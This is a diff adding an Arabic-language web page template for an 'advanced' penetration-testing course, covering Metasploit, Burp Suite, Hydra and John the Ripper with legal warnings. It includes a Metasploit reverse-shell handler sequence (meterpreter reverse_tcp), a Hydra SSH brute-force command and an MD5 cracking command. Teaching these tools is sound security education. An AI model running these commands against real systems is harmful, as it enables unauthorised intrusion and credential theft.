@@ -1,0 +1,181 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<style>
+    .book-container { max-width: 1000px; margin: 0 auto; }
+    .chapter { background-color: #141414; border-radius: 12px; padding: 30px; margin-bottom: 35px; border-left: 6px solid #ff4444; }
+    .chapter-title { color: #ff4444; font-size: 1.7rem; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
+    .code-box { background: #000; border: 1px solid #ff4444; padding: 15px; font-family: 'Courier New', monospace; color: #00ff00; border-radius: 8px; margin: 15px 0; overflow-x: auto; }
+    .warning-box { background: #1a0a0a; border: 1px solid #ff4444; padding: 15px; border-radius: 8px; margin: 15px 0; }
+    .tip-box { background: #0a1a0a; border: 1px solid #00ff00; padding: 15px; border-radius: 8px; margin: 15px 0; }
+</style>
+
+<div class="book-container">
+    <div class="text-center mb-5">
+        <i class="fas fa-skull fs-1 text-danger mb-3"></i>
+        <h1 class="text-danger fw-bold" style="font-size: 3rem;">مسار المتقدم</h1>
+        <p class="text-light fs-5">الموسوعة الكاملة لاختبار الاختراق</p>
+    </div>
+
+    <!-- ================================================================== -->
+    <!-- الفصل الأول: Metasploit (الأكبر والأقوى) -->
+    <!-- ================================================================== -->
+    <div class="chapter">
+        <h2 class="chapter-title">💀 الفصل الأول: Metasploit - إطار الاختراق المتقدم</h2>
+        
+        <h4 class="text-danger mt-4">1. ما هو Metasploit؟</h4>
+        <p>
+            Metasploit هو إطار عمل (Framework) مفتوح المصدر، تم تطويره بواسطة Rapid7. 
+            يعتبر <strong>"السلاح النووي"</strong> في عالم اختبار الاختراق. 
+            يحتوي على آلاف الإكسبلويت (Exploits) والحمولات (Payloads) التي يمكن استخدامها لاستغلال الثغرات الأمنية في الأنظمة والشبكات.
+        </p>
+        
+        <h4 class="text-danger mt-4">2. المكونات الأساسية</h4>
+        <ul>
+            <li><strong>Exploits:</strong> الأكواد التي تستغل الثغرات الأمنية (مثل ثغرة في خدمة SSH أو SMB).</li>
+            <li><strong>Payloads:</strong> الأكواد التي يتم تنفيذها بعد نجاح الاختراق (مثل فتح جلسة تحكم عن بعد).</li>
+            <li><strong>Encoders:</strong> أدوات تشفير لتجنب اكتشاف الحمولات بواسطة برامج مكافحة الفيروسات.</li>
+            <li><strong>Post-Exploitation:</strong> أدوات التحكم بالجهاز المخترق بعد الدخول.</li>
+        </ul>
+
+        <h4 class="text-danger mt-4">3. أوامر أساسية (يجب حفظها)</h4>
+        <div class="code-box">msfconsole</div>
+        <p>يفتح واجهة الأوامر الرئيسية. هذا هو المكان الذي ستبدأ منه كل شيء.</p>
+
+        <div class="code-box">search [اسم_الثغرة]</div>
+        <p>يبحث عن إكسبلويت معين في قاعدة البيانات. مثال: <code>search vsftp</code>.</p>
+
+        <div class="code-box">use [مسار_الإكسبلويت]</div>
+        <p>يختار إكسبلويت معين. مثال: <code>use exploit/multi/handler</code>.</p>
+
+        <div class="code-box">show options</div>
+        <p>يعرض الخيارات المتاحة للإكسبلويت الحالي. يجب أن تملأ هذه الخيارات قبل الهجوم.</p>
+
+        <div class="code-box">set [اسم_الخيار] [قيمة]</div>
+        <p>يضبط قيمة لخيار معين. مثال: <code>set RHOSTS 192.168.1.1</code>.</p>
+
+        <div class="code-box">exploit</div>
+        <p>ينفذ الهجوم ويحاول اختراق الهدف.</p>
+
+        <h4 class="text-danger mt-4">4. مثال عملي: اختراق جهاز على الشبكة</h4>
+        <p>
+            إليك تسلسل الأوامر لاختراق جهاز على الشبكة المحلية (مثال تعليمي فقط):
+        </p>
+        <div class="code-box">
+            msfconsole<br>
+            use exploit/multi/handler<br>
+            set payload windows/meterpreter/reverse_tcp<br>
+            set LHOST 192.168.1.5<br>
+            set LPORT 4444<br>
+            exploit
+        </div>
+        <p><strong>شرح الأوامر:</strong></p>
+        <ul>
+            <li><code>use exploit/multi/handler</code>: يختار مستمع (Handler) ينتظر اتصالاً واردا.</li>
+            <li><code>set payload windows/meterpreter/reverse_tcp</code>: يختار حمولة تعمل على ويندوز وتعيد اتصالاً إلى جهازك.</li>
+            <li><code>set LHOST</code>: يحدد عنوان IP الخاص بجهازك (الذي سيستقبل الاتصال).</li><li><code>set LPORT</code>: يحدد المنفذ الذي سيستمع عليه.</li>
+            <li><code>exploit</code>: يبدأ الاستماع. إذا نجح الهدف في الاتصال، ستحصل على جلسة (Meterpreter).</li>
+        </ul>
+
+        <div class="warning-box">
+            <h5 class="text-danger"><i class="fas fa-gavel"></i> تحذير خطير</h5>
+            <p>هذا المثال يوضح كيف يعمل Metasploit. لكن تطبيقه على جهاز لا تملكه هو جريمة يعاقب عليها القانون بشدة.</p>
+        </div>
+    </div>
+
+    <!-- ================================================================== -->
+    <!-- الفصل الثاني: Burp Suite -->
+    <!-- ================================================================== -->
+    <div class="chapter">
+        <h2 class="chapter-title">🛡️ الفصل الثاني: Burp Suite - حرب الويب</h2>
+        
+        <h4 class="text-danger mt-4">1. ما هو Burp Suite؟</h4>
+        <p>
+            Burp Suite هو إطار عمل متكامل لاختبار أمان تطبيقات الويب. 
+            يعتبر <strong>"المعيار الذهبي"</strong> لمختبرين أمان الويب. 
+            في أي اختبار اختراق لموقع إلكتروني، Burp Suite هو الأداة الأولى والرئيسية.
+        </p>
+
+        <h4 class="text-danger mt-4">2. المكونات الأساسية</h4>
+        <ul>
+            <li><strong>Proxy:</strong> يعترض كل حركة البيانات بين المتصفح والخادم، مما يتيح لك رؤية وتعديل الطلبات.</li>
+            <li><strong>Intruder:</strong> أداة متقدمة لهجمات القوة الغاشمة والاختبارات التلقائية.</li>
+            <li><strong>Repeater:</strong> يسمح لك بإعادة إرسال الطلبات المعدلة لاختبار الثغرات.</li>
+            <li><strong>Scanner:</strong> يقوم بمسح تلقائي للثغرات الأمنية الشائعة (مثل حقن SQL و XSS).</li>
+        </ul>
+
+        <h4 class="text-danger mt-4">3. خطوات العمل الأساسية</h4>
+        <ol>
+            <li>افتح Burp Suite، اذهب إلى Proxy > Intercept، وتأكد أن <code>Intercept is on</code>.</li>
+            <li>في المتصفح، قم بإعداد الـ Proxy ليكون المنفذ <code>127.0.0.1:8080</code>.</li>
+            <li>تصفح الموقع المستهدف. ستظهر كل الطلبات في قسم <strong>HTTP History</strong>.</li>
+            <li>أرسل أي طلب إلى <strong>Repeater</strong>، وقم بتعديله، ثم أرسله لترى رد الخادم.</li>
+        </ol>
+
+        <div class="tip-box">
+            <h5 class="text-success"><i class="fas fa-lightbulb"></i> نصيحة ذهبية</h5>
+            <p>Burp Suite Community Edition مجاني وقوي. استخدمه لتعلم أساسيات اختبار الويب.</p>
+        </div>
+    </div>
+
+    <!-- ================================================================== -->
+    <!-- الفصل الثالث: Hydra & John -->
+    <!-- ================================================================== -->
+    <div class="chapter">
+        <h2 class="chapter-title">🔑 الفصل الثالث: كسر كلمات المرور (Hydra & John)</h2>
+        
+        <h4 class="text-danger mt-4">1. مقدمة في كسر كلمات المرور</h4>
+        <p>
+            كلمات المرور هي نقطة الضعف الأكبر في أي نظام. البشر يختارون كلمات مرور سهلة وضعيفة. أدوات كسر كلمات المرور تستخدم <strong>"القواميس" (Wordlists)</strong> لتجربة آلاف الكلمات في وقت قصير.
+        </p>
+
+        <h4 class="text-danger mt-4">2. Hydra: هجمات القوة الغاشمة</h4>
+        <p>
+            Hydra هي الأداة الأشهر لهجمات <strong>Brute Force</strong>. تدعم بروتوكولات مثل SSH, FTP, HTTP, RDP.
+        </p>
+        <div class="code-box">hydra -l admin -P passwords.txt ssh://192.168.1.1</div>
+        <p>
+            <strong>شرح الأمر:</strong><br>
+            <code>-l admin</code>: اسم المستخدم الذي نريد اختباره.<br>
+            <code>-P passwords.txt</code>: ملف القاموس الذي يحتوي على كلمات المرور المحتملة.<br>
+            <code>ssh://192.168.1.1</code>: البروتوكول والهدف.
+        </p>
+
+        <h4 class="text-danger mt-4">3. John the Ripper: كسر التشفير</h4>
+        <p>
+            John the Ripper هو الأداة الأشهر لكسر التشفير (Hashes). يمكنه فك تشفير MD5, SHA, NTLM وحتى ملفات ZIP و RAR.
+        </p>
+        <div class="code-box">john --format=raw-md5 hash.txt</div>
+        <p>
+            <strong>شرح الأمر:</strong><br>
+            <code>--format=raw-md5</code>: يحدد نوع التشفير.<br>
+            <code>hash.txt</code>: الملف الذي يحتوي على التجزئة (Hash) التي نريد فكها.
+        </p><div class="tip-box">
+            <h5 class="text-success"><i class="fas fa-lightbulb"></i> نصيحة</h5>
+            <p>يجب أن يكون لديك قاموس جيد (مثل RockYou) للحصول على نتائج جيدة.</p>
+        </div>
+    </div>
+
+    <!-- ================================================================== -->
+    <!-- خاتمة المسار -->
+    <!-- ================================================================== -->
+    <div class="chapter">
+        <h2 class="chapter-title">🚀 خاتمة: الطريق إلى الاحتراف</h2>
+        <p>
+            لقد انتهيت من مسار المتقدم. هذا يعني أنك فهمت كيف تعمل أقوى أدوات الاختراق في العالم:
+            Metasploit, Burp Suite, Hydra, John.
+        </p>
+        <p><strong>نصيحة أخيرة:</strong></p>
+        <ul>
+            <li>تدرب على منصات مثل <strong>TryHackMe</strong> و <strong>Hack The Box</strong>.</li>
+            <li>لا تستخدم هذه المهارات إلا لحماية نفسك والآخرين.</li>
+            <li>القراصنة الأخلاقيون هم أبطال العالم الرقمي.</li>
+        </ul>
+    </div>
+
+    <div class="text-center mt-5">
+        <a href="/roadmaps" class="btn btn-main"><i class="fas fa-arrow-left"></i> العودة لصفحة المسارات</a>
+    </div>
+</div>
+
+{% endblock %}
